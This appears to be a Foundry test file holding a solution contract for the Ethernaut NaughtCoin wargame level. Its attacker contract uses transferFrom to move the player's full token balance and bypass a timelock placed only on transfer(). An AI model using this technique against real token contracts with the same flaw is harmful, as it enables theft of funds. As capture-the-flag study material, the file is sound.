// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {NaughtCoin} from "../../src/ethernaut/15_NaughtCoin/NaughtCoin.sol";

contract NaughtCoin_Attacker {
	address player;
	NaughtCoin coreInst;
	
	constructor(NaughtCoin coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		coreInst.transferFrom(player, address(this), coreInst.balanceOf(address(player)));
	}
}
